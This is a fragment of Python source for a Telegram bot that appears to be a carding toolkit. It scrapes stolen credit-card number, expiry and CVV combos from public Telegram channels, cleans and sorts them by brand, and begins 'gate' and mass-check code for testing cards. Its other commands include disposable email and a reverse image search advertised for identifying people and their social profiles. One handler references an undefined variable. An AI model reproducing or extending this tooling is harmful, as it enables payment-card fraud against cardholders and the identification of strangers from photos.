                tineye_url = f"https://tineye.com/api/v1/result_json/?url={image_url}"
                async with session.get(tineye_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        results["tineye"] = {
                            "matches": data.get("count", 0),
                            "results": data.get("results", [])[:5]
                        }
            except:
                pass
            
            # Google Lens search URL
            results["google_lens"] = f"https://lens.google.com/uploadbyurl?url={image_url}"
            
            # Yandex Images search URL
            results["yandex"] = f"https://yandex.com/images/search?rpt=imageview&url={image_url}"
            
            # SauceNAO for anime/artwork
            try:
                saucenao_url = f"https://saucenao.com/search.php?url={image_url}&output_type=2"
                async with session.get(saucenao_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if "results" in data:
                            for r in data["results"][:3]:
                                results["similar_images"].append({
                                    "title": r.get("header", {}).get("index_name", "Unknown"),
                                    "similarity": r.get("header", {}).get("similarity", "0"),
                                    "url": r.get("data", {}).get("ext_urls", [""])[0] if r.get("data", {}).get("ext_urls") else ""
                                })
            except:
                pass
            
            # PimEyes alternative - face search hint
            results["pimeyes"] = f"https://pimeyes.com/en"
            
        return {"success": True, "results": results}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

@require_approval
async def reverse_search_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reverse image search - find similar images and faces"""
    user = update.effective_user
    
    image_data = None
    mime_type = "image/jpeg"
    image_url = None
    
    # Check if replying to a photo
    if update.message.reply_to_message and update.message.reply_to_message.photo:
        photo = update.message.reply_to_message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        image_data = await file.download_as_bytearray()
        image_url = file.file_path
    
    # Check if photo attached to message
    elif update.message.photo:
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        image_data = await file.download_as_bytearray()
        image_url = file.file_path
    
    # Check if URL provided
    elif context.args:
        image_url = context.args[0]
        # Download from URL
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(image_url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        content_type = resp.headers.get('Content-Type', 'image/jpeg')
                        if 'png' in content_type:
                            mime_type = "image/png"
                        elif 'webp' in content_type:
                            mime_type = "image/webp"
        except:
            pass
    
    if not image_data:
        await update.message.reply_text(
            "🔍 <b>Reverse Image Search</b>\n\n"
            "<b>Usage:</b>\n"
            "• Reply to an image with <code>/revrs</code>\n"
            "• <code>/revrs [image_url]</code>\n"
            "• Send image with <code>/revrs</code> caption\n\n"
            "<b>Features:</b>\n"
            "• Identify people in images\n"
            "• Show social media profiles\n"
            "• Face recognition\n"
            "• Works with any photo!",
            parse_mode=ParseMode.HTML
        )
        return
    
    loading_msg = await update.message.reply_text(
        "🔍 <b>Analyzing image...</b>\n\n"
        "🤖 AI is identifying the person...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        # Identify the person using AI vision
        person_result = await identify_person_from_image(bytes(image_data), mime_type)
        
        if person_result["success"]:
            identification = sanitize_ai_response(person_result["identification"])
            
            # Truncate if too long
            if len(identification) > 2500:
                identification = identification[:2500] + "..."
            
            response_text = f"""🔍 <b>Image Analysis Results</b>

👤 <b>Person Identification:</b>

{identification}

━━━━━━━━━━━━━━━━━━━━━━

<i>🤖 Powered by AI Vision</i>"""
            
            await loading_msg.edit_text(
                response_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
        else:
            # Show error with details
            error_msg = person_result.get('error', 'Unknown error')
            await loading_msg.edit_text(
                f"❌ <b>Could not analyze image</b>\n\n"
                f"<b>Error:</b> {html_escape(str(error_msg)[:200])}\n\n"
                f"<i>Make sure image is clear and try again.</i>",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# TEMP MAIL GENERATOR
# ============================================================================

import hashlib
import string as string_module

TEMPMAIL_BASE_URL = "https://api.mail.tm"
TEMPMAIL_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

tempmail_token_map = {}
tempmail_user_tokens = {}
tempmail_user_emails = {}
tempmail_seen_messages = {}
tempmail_polling_active = {}

def tempmail_short_id(email):
    import time as t
    unique_string = email + str(t.time())
    return hashlib.md5(unique_string.encode()).hexdigest()[:10]

def tempmail_random_username(length=8):
    return ''.join(random.choice(string_module.ascii_lowercase) for _ in range(length))

def tempmail_random_password(length=12):
    chars = string_module.ascii_letters + string_module.digits
    return ''.join(random.choice(chars) for _ in range(length))

def tempmail_get_domain():
    try:
        response = requests.get(f"{TEMPMAIL_BASE_URL}/domains", headers=TEMPMAIL_HEADERS, timeout=10)
        data = response.json()
        if isinstance(data, list) and data:
            return data[0]['domain']
        elif 'hydra:member' in data and data['hydra:member']:
            return data['hydra:member'][0]['domain']
    except:
        pass
    return None

def tempmail_create_account(email, password):
    try:
        data = {"address": email, "password": password}
        response = requests.post(f"{TEMPMAIL_BASE_URL}/accounts", headers=TEMPMAIL_HEADERS, json=data, timeout=10)
        if response.status_code in [200, 201]:
            return response.json()
    except:
        pass
    return None

def tempmail_get_token(email, password):
    try:
        data = {"address": email, "password": password}
        response = requests.post(f"{TEMPMAIL_BASE_URL}/token", headers=TEMPMAIL_HEADERS, json=data, timeout=10)
        if response.status_code == 200:
            return response.json().get('token')
    except:
        pass
    return None

def tempmail_list_messages(token):
    try:
        headers = {**TEMPMAIL_HEADERS, "Authorization": f"Bearer {token}"}
        response = requests.get(f"{TEMPMAIL_BASE_URL}/messages", headers=headers, timeout=10)
        data = response.json()
        if isinstance(data, list):
            return data
        elif 'hydra:member' in data:
            return data['hydra:member']
    except:
        pass
    return []

def tempmail_get_message(token, message_id):
    try:
        headers = {**TEMPMAIL_HEADERS, "Authorization": f"Bearer {token}"}
        response = requests.get(f"{TEMPMAIL_BASE_URL}/messages/{message_id}", headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def tempmail_html_to_text(html_content):
    from bs4 import BeautifulSoup
    if isinstance(html_content, list):
        html_content = ''.join(html_content)
    soup = BeautifulSoup(html_content, 'html.parser')
    for a_tag in soup.find_all('a', href=True):
        url = a_tag['href']
        a_tag.string = f"{a_tag.text} [{url}]"
    text = soup.get_text()
    import re
    return re.sub(r'\s+', ' ', text).strip()

async def tempmail_poll_inbox(bot, user_id, token, email):
    """Background task to poll for new emails and notify user"""
    import asyncio
    
    tempmail_polling_active[user_id] = True
    tempmail_seen_messages[user_id] = set()
    
    initial_messages = tempmail_list_messages(token)
    for msg in initial_messages:
        tempmail_seen_messages[user_id].add(msg.get('id'))
    
    poll_count = 0
    max_polls = 180
    
    while poll_count < max_polls and tempmail_polling_active.get(user_id):
        try:
            await asyncio.sleep(10)
            poll_count += 1
            
            messages = tempmail_list_messages(token)
            if not messages:
                continue
            
            for msg in messages:
                msg_id = msg.get('id')
                if msg_id and msg_id not in tempmail_seen_messages.get(user_id, set()):
                    tempmail_seen_messages[user_id].add(msg_id)
                    
                    from_addr = msg.get('from', {}).get('address', 'Unknown')
                    subject = msg.get('subject', 'No Subject')[:50]
                    
                    details = tempmail_get_message(token, msg_id)
                    content_preview = ""
                    if details:
                        if 'html' in details and details['html']:
                            content_preview = tempmail_html_to_text(details['html'])[:500]
                        elif 'text' in details:
                            content_preview = details['text'][:500]
                    
                    notification = f"""📬 <b>New Email Received!</b>
━━━━━━━━━━━━━━━━━━

📧 <b>To:</b> <code>{email}</code>
📤 <b>From:</b> <code>{from_addr}</code>
📋 <b>Subject:</b> {subject}

━━━━━━━━━━━━━━━━━━

{content_preview}{'...' if len(content_preview) >= 500 else ''}"""
                    
                    try:
                        await bot.send_message(chat_id=user_id, text=notification, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
                    except Exception as e:
                        print(f"Failed to notify user {user_id}: {e}")
                        
        except Exception as e:
            print(f"Polling error for user {user_id}: {e}")
            await asyncio.sleep(30)
    
    tempmail_polling_active[user_id] = False

@require_approval
async def tempmail_generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate temporary email"""
    import asyncio
    import time as time_mod
    user = update.effective_user
    chat_type = update.effective_chat.type
    
    loading_msg = await update.message.reply_text("📧 Generating temporary email...")
    
    try:
        loop = asyncio.get_running_loop()
        
        args_text = ' '.join(context.args) if context.args else ""
        if ':' in args_text:
            parts = args_text.split(':')
            username = parts[0].strip()
            password = parts[1].strip() if len(parts) > 1 else tempmail_random_password()
        else:
            username = tempmail_random_username()
            password = tempmail_random_password()
        
        domain = await loop.run_in_executor(None, tempmail_get_domain)
        if not domain:
            await loading_msg.edit_text(ae("❌ Failed to get mail domain. Try again."))
            return
        
        email = f"{username}@{domain}"
        
        account = await loop.run_in_executor(None, tempmail_create_account, email, password)
        if not account:
            await loading_msg.edit_text(ae("❌ Username already taken. Choose another one."))
            return
        
        await asyncio.sleep(2)
        
        token = await loop.run_in_executor(None, tempmail_get_token, email, password)
        if not token:
            await loading_msg.edit_text(ae("❌ Failed to get token. Try again."))
            return
        
        short_id = tempmail_short_id(email)
        tempmail_token_map[short_id] = token
        tempmail_user_tokens[user.id] = token
        tempmail_user_emails[user.id] = email
        
        tempmail_polling_active[user.id] = False
        asyncio.create_task(tempmail_poll_inbox(context.bot, user.id, token, email))
        
        message = f"""✅ 𝗧𝗲𝗺𝗽 𝗠𝗮𝗶𝗹 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱

📧 𝗘𝗺𝗮𝗶𝗹: <code>{email}</code>

📬 Auto-notifications enabled (30 min)
💡 New emails will be sent to you instantly!
📥 Use /cmail to manually check inbox

𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 @{user.username or user.first_name}"""
        
        await loading_msg.edit_text(message, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

@require_approval
async def tempmail_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check temp mail inbox"""
    import asyncio
    user = update.effective_user
    
    token = tempmail_user_tokens.get(user.id)
    email = tempmail_user_emails.get(user.id, "your temp mail")
    
    if not token:
        await update.message.reply_text(
            "❌ <b>No temp mail found!</b>\n\n"
            "Generate one first with /tmail",
            parse_mode=ParseMode.HTML
        )
        return
    
    loading_msg = await update.message.reply_text(f"📥 Checking inbox for {email}...")
    
    try:
        loop = asyncio.get_running_loop()
        messages = await loop.run_in_executor(None, tempmail_list_messages, token)
        
        if not messages:
            await loading_msg.edit_text("📭 No messages in inbox (or invalid token)")
            return
        
        output = "📧 <b>Your Inbox</b>\n━━━━━━━━━━━━━━━━━━\n\n"
        
        for idx, msg in enumerate(messages[:10], 1):
            from_addr = msg.get('from', {}).get('address', 'Unknown')
            subject = msg.get('subject', 'No Subject')[:50]
            msg_id = msg.get('id', '')
            output += f"<b>{idx}.</b> From: <code>{from_addr}</code>\n"
            output += f"   Subject: {subject}\n"
            output += f"   📖 /rmail_{msg_id[:20]}\n\n"
        
        output += "━━━━━━━━━━━━━━━━━━\nClick /rmail_[id] to read message"
        
        await loading_msg.edit_text(output, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

@require_approval
async def tempmail_read(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Read a specific temp mail message"""
    import asyncio
    user = update.effective_user
    
    token = tempmail_user_tokens.get(user.id)
    if not token:
        await update.message.reply_text(ae("❌ No temp mail found. Generate one with /tmail first."))
        return
    
    msg_text = update.message.text
    if msg_text.startswith('/rmail_'):
        msg_id = msg_text[7:].strip()
    elif context.args:
        msg_id = context.args[0]
    else:
        await update.message.reply_text(ae("❌ Usage: /rmail_[message_id]"))
        return
    
    loading_msg = await update.message.reply_text("📖 Loading message...")
    
    try:
        loop = asyncio.get_running_loop()
        
        messages = await loop.run_in_executor(None, tempmail_list_messages, token)
        full_msg_id = None
        for m in messages:
            if m.get('id', '').startswith(msg_id):
                full_msg_id = m.get('id')
                break
        
        if not full_msg_id:
            await loading_msg.edit_text(ae("❌ Message not found."))
            return
        
        details = await loop.run_in_executor(None, tempmail_get_message, token, full_msg_id)
        
        if not details:
            await loading_msg.edit_text(ae("❌ Failed to load message."))
            return
        
        from_addr = details.get('from', {}).get('address', 'Unknown')
        subject = details.get('subject', 'No Subject')
        
        if 'html' in details and details['html']:
            content = await loop.run_in_executor(None, tempmail_html_to_text, details['html'])
        elif 'text' in details:
            content = details['text']
        else:
            content = "Content not available."
        
        if len(content) > 3500:
            content = content[:3500] + "... [truncated]"
        
        output = f"""📧 <b>Email Details</b>
━━━━━━━━━━━━━━━━━━

📤 <b>From:</b> <code>{from_addr}</code>
📋 <b>Subject:</b> {subject}

━━━━━━━━━━━━━━━━━━

{content}"""
        
        await loading_msg.edit_text(output, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# WEBSITE ANALYZER - GATEWAY DETECTION & SECURITY ANALYSIS
# ============================================================================

@require_approval
async def web_analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Analyze website for payment gateways and security features"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>Website Analyzer</b>\n\n"
            "Analyze any website for payment gateways and security.\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/web example.com</code>\n\n"
            "💡 <b>Example:</b>\n"
            "<code>/web amazon.com</code>\n"
            "<code>/web shopify.com</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = context.args[0].strip()
    
    url = url.replace('https://', '').replace('http://', '').split('/')[0]
    
    if not url or '.' not in url:
        await update.message.reply_text(ae("❌ Invalid URL! Use format: /web example.com"))
        return
    
    status_msg = await update.message.reply_text(ae(f"🔍 Analyzing <code>{url}</code>..."), parse_mode=ParseMode.HTML)
    
    try:
        from modules.web_analyzer import analyze_website
        
        loop = asyncio.get_running_loop()
        result = await asyncio.wait_for(
            loop.run_in_executor(None, analyze_website, url, user.username or user.first_name, user.id),
            timeout=30.0
        )
        
        await status_msg.edit_text(result, parse_mode=ParseMode.HTML)
        
    except asyncio.TimeoutError:
        await status_msg.edit_text(ae("❌ Timeout! Website took too long to respond."))
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ Error: {str(e)[:100]}"))

# ============================================================================
# CC SCRAPER - SCRAPE CARDS FROM TELEGRAM CHANNELS (Web Preview)
# ============================================================================

import re as re_module
CC_PATTERN = re_module.compile(r'\b(\d{13,19})[|/\s](\d{1,2})[|/\s](\d{2,4})[|/\s](\d{3,4})\b')
CC_PATTERN_ALT = re_module.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b')

def extract_ccs_from_text(text):
    """Extract credit cards from text"""
    cards = set()
    for match in CC_PATTERN.finditer(text):
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[-2:]
        if len(mm) == 1:
            mm = f"0{mm}"
        card = f"{cc}|{mm}|{yy}|{cvv}"
        if 13 <= len(cc) <= 19 and 1 <= int(mm) <= 12:
            cards.add(card)
    
    for match in CC_PATTERN_ALT.finditer(text):
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[-2:]
        if len(mm) == 1:
            mm = f"0{mm}"
        card = f"{cc}|{mm}|{yy}|{cvv}"
        if 13 <= len(cc) <= 19 and 1 <= int(mm) <= 12:
            cards.add(card)
    
    return list(cards)

@require_approval
async def cc_scraper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Scrape CCs from Telegram channel via web preview - /scr <channel> [amount]"""
    import asyncio
    user = update.effective_user
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ <b>Usage:</b> <code>/scr channel_username [amount]</code>\n\n"
            "📋 <b>Examples:</b>\n"
            "<code>/scr ccshop</code>\n"
            "<code>/scr ccshop 500</code>\n\n"
            "💡 Default: 100 messages, Max: 1000\n"
            "⚠️ Only channels with public preview enabled work",
            parse_mode=ParseMode.HTML
        )
        return
    
    channel = context.args[0].lstrip('@')
    amount = 100
    if len(context.args) > 1:
        try:
            amount = min(int(context.args[1]), 1000)
        except:
            amount = 100
    
    loading_msg = await update.message.reply_text(ae(f"🔄 Scraping @{channel}...\n📊 Target: {amount} messages"))
    
    try:
        loop = asyncio.get_running_loop()
        
        def scrape_channel_web():
            """Web preview scraping with pagination"""
            import requests
            from bs4 import BeautifulSoup
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            all_cards = []
            total_messages = 0
            before_id = None
            pages_scraped = 0
            max_pages = (amount // 20) + 1
            
            while total_messages < amount and pages_scraped < max_pages:
                if before_id:
                    url = f"https://t.me/s/{channel}?before={before_id}"
                else:
                    url = f"https://t.me/s/{channel}"
                
                try:
                    response = requests.get(url, headers=headers, timeout=30)
                    if response.status_code != 200:
                        if pages_scraped == 0:
                            return None, 0, f"Channel not accessible (Status: {response.status_code})"
                        break
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    messages = soup.find_all('div', class_='tgme_widget_message')
                    
                    if not messages:
                        if pages_scraped == 0:
                            page_desc = soup.find('div', class_='tgme_page_description')
                            desc = page_desc.get_text()[:100] if page_desc else ""
                            return None, 0, f"No public preview for @{channel}.\nThis channel doesn't allow web preview."
                        break
                    
                    for msg in messages:
                        text_elem = msg.find('div', class_='tgme_widget_message_text')
                        if text_elem:
                            text = text_elem.get_text()
                            cards = extract_ccs_from_text(text)
                            all_cards.extend(cards)
                        total_messages += 1
                    
                    first_msg = messages[0]
                    data_post = first_msg.get('data-post', '')
                    if '/' in data_post:
                        msg_id = data_post.split('/')[-1]
                        before_id = int(msg_id)
                    else:
                        break
                    
                    pages_scraped += 1
                    
                except Exception as e:
                    if pages_scraped == 0:
                        return None, 0, f"Error: {str(e)[:100]}"
                    break
            
            unique_cards = list(set(all_cards))
            return unique_cards, total_messages, None
        
        cards, msg_count, error = await loop.run_in_executor(None, scrape_channel_web)
        
        if error:
            await loading_msg.edit_text(ae(f"❌ {error}"), parse_mode=ParseMode.HTML)
            return
        
        if not cards:
            await loading_msg.edit_text(
                f"📭 <b>No cards found in @{channel}</b>\n\n"
                f"📊 Messages checked: {msg_count}\n"
                f"⚙️ Method: {method}",
                parse_mode=ParseMode.HTML
            )
            return
        
        if len(cards) <= 30:
            cards_text = "\n".join([f"<code>{c}</code>" for c in cards])
            message = f"""✅ <b>CC Scraper Results</b>
━━━━━━━━━━━━━━━━━━

📢 <b>Channel:</b> @{channel}
📊 <b>Messages:</b> {msg_count}
🃏 <b>Cards Found:</b> {len(cards)}
⚙️ <b>Method:</b> {method}

━━━━━━━━━━━━━━━━━━

{cards_text}

━━━━━━━━━━━━━━━━━━
𝗦𝗰𝗿𝗮𝗽𝗲𝗱 𝗯𝘆 @{user.username or user.first_name}"""
            await loading_msg.edit_text(message, parse_mode=ParseMode.HTML)
        else:
            file_content = "\n".join(cards)
            from io import BytesIO
            file = BytesIO(file_content.encode('utf-8'))
            file.name = f"scraped_{channel}_{len(cards)}.txt"
            
            await loading_msg.delete()
            await update.message.reply_document(
                document=file,
                caption=ae(f"✅ <b>Scraped {len(cards)} cards from @{channel}</b>\n"
                        f"📊 Messages: {msg_count} | Method: {method}\n\n"
                        f"𝗦𝗰𝗿𝗮𝗽𝗲𝗱 𝗯𝘆 @{user.username or user.first_name}"),
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# CC CLEANER - EXTRACT & FILTER CARDS FROM JUNK
# ============================================================================

@require_approval
async def clean_cc_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clean and extract cards from uploaded file"""
    user = update.effective_user
    
    # Check if message has document
    if not update.message.document:
        await update.message.reply_text(
            "❌ <b>No file attached!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "1. Send /clean command\n"
            "2. Upload a .txt file with messy card data\n\n"
            "💡 <b>The bot will extract and clean all valid cards!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    document = update.message.document
    
    # Check if it's a txt file
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(ae("❌ Only .txt files are supported!"))
        return
    
    loading_msg = await update.message.reply_text("🧹 Cleaning and extracting cards...")
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        # Extract cards from junk
        raw_cards = extract_cards_from_junk(text_content)
        
        if not raw_cards:
            await loading_msg.edit_text(
                "❌ <b>No valid cards found!</b>\n\n"
                "The file doesn't contain any valid card formats.\n\n"
                "💡 <b>Supported formats:</b>\n"
                "• CC|MM|YY|CVV\n"
                "• CC:MM:YY:CVV\n"
                "• CC/MM/YY/CVV\n"
                "• CC MM YY CVV",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Format and clean cards
        formatted_cards = clean_and_format_cards(raw_cards)
        unique_cards = remove_duplicates(formatted_cards)
        sorted_cards = sort_cards(unique_cards, by='brand')
        
        # Get statistics
        stats = get_statistics(sorted_cards)
        
        # Create result message
        sep = "━━━━━━━━━━━━━━━━━━━━"
        result_text = f"""💜 <b>ONICHAN • CC CLEANER</b>
{sep}
📄 <b>File</b>    : {document.file_name}
📊 <b>Found</b>   : {len(raw_cards)}
✅ <b>Unique</b>  : {len(unique_cards)}
🗑️ <b>Dupes</b>   : {len(raw_cards) - len(unique_cards)}
{sep}
💳 <b>By Brand:</b>
"""
        
        for brand, count in stats['by_brand'].items():
            result_text += f"• {brand}: {count} cards\n"
        
        result_text += f"\n🔢 <b>Unique BINs:</b> {stats['unique_bins']}\n\n"
        result_text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        result_text += "💳 <b>CLEANED CARDS:</b>\n\n"
        
        # Show first 20 cards
        for i, card in enumerate(sorted_cards[:20], 1):
            result_text += f"{i}. <code>{card['card']}</code> [{card['brand']}]\n"
        
        if len(sorted_cards) > 20:
            result_text += f"\n<i>...and {len(sorted_cards) - 20} more cards</i>\n"
        
        result_text += f"""
━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Cleaned by:</b> @{user.username or user.first_name}
🤖 <b>Bot:</b> @{BOT_USERNAME}

💡 <b>Tip:</b> Copy cards and use /mass to check them!"""
        
        await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        
        # If more than 20 cards, send full list as file
        if len(sorted_cards) > 20:
            # Create cleaned file content
            cleaned_content = "\n".join([card['card'] for card in sorted_cards])
            cleaned_filename = f"cleaned_{document.file_name}"
            
            # Send as document
            from io import BytesIO
            file_bytes = BytesIO(cleaned_content.encode('utf-8'))
            file_bytes.name = cleaned_filename
            
            await update.message.reply_document(
                document=file_bytes,
                filename=cleaned_filename,
                caption=f"📁 <b>Full cleaned list ({len(sorted_cards)} cards)</b>",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

@require_approval
async def filter_cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Filter cards by brand from uploaded file"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/filter VISA</code> (then upload file)\n"
            "<code>/filter MASTERCARD</code>\n"
            "<code>/filter AMEX</code>\n\n"
            "💡 <b>Supported brands:</b>\n"
            "VISA, MASTERCARD, AMEX, DISCOVER, JCB, DINERS",
            parse_mode=ParseMode.HTML
        )
        return
    
    brand_filter = context.args[0].upper()
    
    # Store filter in user context
    context.user_data['cc_filter'] = brand_filter
    
    await update.message.reply_text(
        f"✅ <b>Filter set to: {brand_filter}</b>\n\n"
        f"📁 Now upload a .txt file with cards!\n\n"
        f"The bot will extract only {brand_filter} cards.",
        parse_mode=ParseMode.HTML
    )

@require_approval
async def handle_filter_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload for filtering"""
    user = update.effective_user
    
    # Check if filter is set
    if 'cc_filter' not in context.user_data:
        return  # Not a filter operation
    
    brand_filter = context.user_data['cc_filter']
    
    # Check if message has document
    if not update.message.document:
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(ae("❌ Only .txt files are supported!"))
        return
    
    loading_msg = await update.message.reply_text(ae(f"🔍 Filtering {brand_filter} cards..."))
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        # Extract and filter cards
        raw_cards = extract_cards_from_junk(text_content)
        formatted_cards = clean_and_format_cards(raw_cards)
        unique_cards = remove_duplicates(formatted_cards)
        filtered_cards = filter_by_brand(unique_cards, [brand_filter])
        
        if not filtered_cards:
            await loading_msg.edit_text(
                f"❌ <b>No {brand_filter} cards found!</b>\n\n"
                f"Found {len(unique_cards)} total cards, but none are {brand_filter}.",
                parse_mode=ParseMode.HTML
            )
            # Clear filter
            del context.user_data['cc_filter']
            return
        
        # Create result
        sep = "━━━━━━━━━━━━━━━━━━━━"
        result_text = f"""💜 <b>ONICHAN • FILTER {brand_filter}</b>
{sep}
📄 <b>File</b>    : {document.file_name}
📊 <b>Total</b>   : {len(unique_cards)}
✅ <b>{brand_filter}</b> : {len(filtered_cards)}
{sep}
"""
        
        for i, card in enumerate(filtered_cards[:20], 1):
            result_text += f"{i}. <code>{card['card']}</code>\n"
        
        if len(filtered_cards) > 20:
            result_text += f"\n<i>...and {len(filtered_cards) - 20} more cards</i>\n"
        
        result_text += f"""
━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Filtered by:</b> @{user.username or user.first_name}"""
        
        await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        
        # Send full list if more than 20
        if len(filtered_cards) > 20:
            cleaned_content = "\n".join([card['card'] for card in filtered_cards])
            cleaned_filename = f"{brand_filter}_{document.file_name}"
            
            from io import BytesIO
            file_bytes = BytesIO(cleaned_content.encode('utf-8'))
            file_bytes.name = cleaned_filename
            
            await update.message.reply_document(
                document=file_bytes,
                filename=cleaned_filename,
                caption=f"📁 <b>{brand_filter} cards ({len(filtered_cards)} total)</b>",
                parse_mode=ParseMode.HTML
            )
        
        # Clear filter
        del context.user_data['cc_filter']
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))
        if 'cc_filter' in context.user_data:
            del context.user_data['cc_filter']

# ============================================================================
# GATE CHECKING COMMANDS
# ============================================================================

def parse_card(text):
    """Parse card details from text - supports multiple formats"""
    # Remove command
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        return None
    
    card_data = parts[1].replace(" ", "").replace(":", "|").replace("/", "|")
    card_parts = card_data.split("|")
    
    cc = mm = yy = cvv = None
    
    if len(card_parts) >= 4:
        # Format: CC|MM|YY|CVV (standard)
        cc = card_parts[0][:16]
        mm = card_parts[1].zfill(2)
        yy = card_parts[2][-2:]
        cvv = card_parts[3][:4]
    elif len(card_parts) == 3:
        # Format: CC|MMYY|CVV or CC|YYYY|CVV (combined date)
        cc = card_parts[0][:16]
        date_part = card_parts[1]
        cvv = card_parts[2][:4]
        
        if len(date_part) == 4:
            # Could be MMYY or YYYY
            mm = date_part[:2]
            yy = date_part[2:]
        elif len(date_part) == 2:
            # Just YY, assume current month
            import datetime
            mm = str(datetime.datetime.now().month).zfill(2)
            yy = date_part
        else:
            return None
    else:
        return None
    
    # Validate all parts are digits
    if not all(p and p.isdigit() for p in [cc, mm, yy, cvv]):
        return None
    
    # Validate lengths
    if not (len(cc) >= 15 and len(mm) == 2 and len(yy) == 2 and len(cvv) >= 3):
        return None
    
    return cc, mm, yy, cvv

def extract_cards_from_text(text):
    """Extract all valid card combos from text - supports multiple formats"""
    import re
    
    cards = []
    
    # Pattern 1: CC|MM|YY|CVV (4 parts)
    pattern_4part = r'(\d{15,16})[|:/\s]+(\d{1,2})[|:/\s]+(\d{2,4})[|:/\s]+(\d{3,4})'
    
    # Pattern 2: CC|MMYY|CVV (3 parts with combined date)
    pattern_3part = r'(\d{15,16})[|:/\s]+(\d{4})[|:/\s]+(\d{3,4})'
    
    # Try 4-part pattern first
    matches = re.findall(pattern_4part, text)
    for match in matches:
        cc = match[0][:16]
        mm = match[1].zfill(2)
        yy = match[2][-2:]
        cvv = match[3][:4]
        
        if (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit() and
            len(cc) >= 15 and len(mm) == 2 and len(yy) == 2 and len(cvv) >= 3):
            cards.append((cc, mm, yy, cvv))
    
    # Try 3-part pattern for any remaining cards
    matches_3 = re.findall(pattern_3part, text)
    for match in matches_3:
        cc = match[0][:16]
        date_part = match[1]
        cvv = match[2][:4]
        
        mm = date_part[:2]
        yy = date_part[2:]
        
        card_tuple = (cc, mm, yy, cvv)
        if card_tuple not in cards:  # Avoid duplicates
            if (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit() and
                len(cc) >= 15 and len(mm) == 2 and len(yy) == 2 and len(cvv) >= 3):
                cards.append(card_tuple)
    
    return cards

def get_mass_check_limit(user_id):
    """Get mass check limit for user"""
    if is_owner(user_id):
        return MASS_CHECK_LIMITS["owner"]
    elif is_premium(user_id):
        return MASS_CHECK_LIMITS["premium"]
    else:
        return MASS_CHECK_LIMITS["free"]

def _build_gate_response(cc, mm, yy, cvv, status_str, message, gate_display, bin_info, elapsed, username, proxy_str="None"):
